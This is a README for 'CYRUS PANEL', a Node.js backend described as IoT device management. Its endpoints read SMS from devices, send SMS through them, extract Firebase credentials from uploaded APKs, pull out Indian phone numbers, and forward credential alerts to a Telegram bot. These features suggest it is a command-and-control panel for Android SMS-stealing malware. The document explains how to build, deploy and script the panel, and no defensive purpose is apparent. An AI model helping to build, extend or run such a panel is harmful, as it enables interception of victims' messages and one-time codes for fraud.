# CYRUS PANEL – Node.js Backend

A production-ready **Node.js + Express** backend for the CYRUS PANEL IoT device management system.

## What Changed

The original panel was a **monolithic 22,000-line HTML file (~942KB)** with everything inlined — React, CSS, Firebase logic, APK parsing, and Telegram integration — all running client-side in the browser.

This conversion extracts the backend logic into a proper **server-side Node.js application** with:

- ✅ **Express.js** API server with proper routing
- ✅ **Server-side Firebase proxy** (no more CORS issues, credentials stay server-side)
- ✅ **Server-side APK parsing** (faster, handles large files, no client-side memory issues)
- ✅ **Server-side Telegram notifications** (bot token hidden from client)
- ✅ **Rate limiting, Helmet security, compression**
- ✅ **Input validation & error handling**
- ✅ **Clean modular architecture** (services, routes, middleware)
- ✅ **Static frontend serving** (same UI, now served properly)

## Project Structure

```
indianpanel/
├── server.js                    # Express application entry point
├── package.json                 # Dependencies & scripts
├── .env.example                 # Environment variable template
│
├── src/
│   ├── config/
│   │   └── index.js             # Centralized configuration
│   ├── middleware/
│   │   ├── errorHandler.js      # Global error handling
│   │   ├── rateLimiter.js       # API rate limiting
│   │   └── validate.js          # Request validation
│   ├── routes/
│   │   ├── api.js               # API router (mounts sub-routes)
│   │   ├── firebase.js          # Firebase proxy endpoints
│   │   ├── devices.js           # Device management endpoints
│   │   ├── apk.js               # APK parsing endpoint
│   │   ├── telegram.js          # Telegram notification endpoints
│   │   └── health.js            # Health check
│   ├── services/
│   │   ├── firebase.js          # Firebase Realtime DB operations
│   │   ├── telegram.js          # Telegram Bot API integration
│   │   ├── apkParser.js         # APK file analysis
│   │   ├── devices.js           # Device data normalization
│   │   └── phoneExtractor.js    # Indian phone number extraction
│   └── utils/
│       └── format.js            # Formatting utilities
│
├── public/                      # Static frontend files (auto-built)
│   ├── index.html               # Main panel UI
│   ├── js/
│   │   ├── cyrus-api.js         # Client-side API wrapper
│   │   └── cyrus-connection.js  # Connection state manager
│   ├── route-assets/            # Shared CSS/JS for route pages
│   ├── dashboard/               # Dashboard route
│   ├── settings/                # Settings route
│   └── ...                      # Other static routes
│
└── scripts/
    └── build-frontend.js        # Copies static files to public/
```

## Quick Start

```bash
# 1. Install dependencies
npm install

# 2. Copy environment config and fill in your values
cp .env.example .env

# 3. Build the static frontend
npm run build

# 4. Start the server
npm start

# Or for development with auto-reload:
npm run dev
```

The server will start on `http://localhost:3000`.

## API Endpoints

### Health Check
| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/health` | Server health & uptime |

### Firebase Proxy
| Method | Endpoint | Body | Description |
|--------|----------|------|-------------|
| POST | `/api/firebase/read` | `{url, key, path, params?}` | Read data from Firebase |
| POST | `/api/firebase/write` | `{url, key, path, data}` | Write data to Firebase |
| POST | `/api/firebase/update` | `{url, key, path, data}` | PATCH data in Firebase |
| POST | `/api/firebase/delete` | `{url, key, path}` | Delete data from Firebase |

### Device Management
| Method | Endpoint | Body | Description |
|--------|----------|------|-------------|
| POST | `/api/devices/list` | `{url, key}` | List all devices (normalized) |
| POST | `/api/devices/:id` | `{url, key}` | Get single device details |
| POST | `/api/devices/:id/messages` | `{url, key}` | Get device SMS messages |
| POST | `/api/devices/:id/send-sms` | `{url, key, to, message}` | Queue SMS on device |
| POST | `/api/devices/:id/delete` | `{url, key}` | Delete a device |

### APK Parsing
| Method | Endpoint | Body | Description |
|--------|----------|------|-------------|
| POST | `/api/apk/parse` | `multipart: file` | Parse APK for Firebase creds |

### Telegram
| Method | Endpoint | Body | Description |
|--------|----------|------|-------------|
| POST | `/api/telegram/notify` | `{message}` | Send custom notification |
| POST | `/api/telegram/credential-alert` | `{url, key}` | Send login alert |

## Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `PORT` | `3000` | Server port |
| `NODE_ENV` | `development` | Environment mode |
| `TG_BOT_TOKEN` | | Telegram bot token |
| `TG_CHAT_ID` | | Telegram chat ID |
| `RATE_LIMIT_WINDOW_MS` | `900000` | Rate limit window (15 min) |
| `RATE_LIMIT_MAX_REQUESTS` | `100` | Max requests per window |
| `MAX_UPLOAD_SIZE_MB` | `50` | Max APK upload size |
| `SESSION_SECRET` | | Session signing secret |

## Client-Side API

The frontend can use the `CyrusAPI` class:

```html
<script src="/js/cyrus-api.js"></script>
<script>
  const api = new CyrusAPI("/api");

  // List devices
  const { devices, count, online } = await api.listDevices(fbUrl, fbKey);

  // Send SMS
  await api.sendSms(fbUrl, fbKey, deviceId, "+91XXXXXXXXXX", "Hello");

  // Parse APK
  const result = await api.parseApk(fileInput.files[0]);
</script>
```

## Security Improvements

1. **Firebase credentials** are sent to the server, not exposed in the browser URL
2. **Telegram bot token** is server-side only (never sent to the client)
3. **Rate limiting** prevents API abuse
4. **Helmet** sets security headers
5. **Input validation** on all endpoints
6. **File upload filtering** (only .apk files accepted)
7. **CORS** configurable for production

## Deployment

### Docker (recommended)
```dockerfile
FROM node:20-slim
WORKDIR /app
COPY package*.json ./
RUN npm ci --production
COPY . .
RUN npm run build
EXPOSE 3000
CMD ["node", "server.js"]
```

### Cloudflare Workers / Vercel
The Express app can be adapted for serverless with `serverless-http`.

### PM2
```bash
npm install -g pm2
pm2 start server.js --name cyrus-panel
pm2 save
```

## License

UNLICENSED – Private use only.
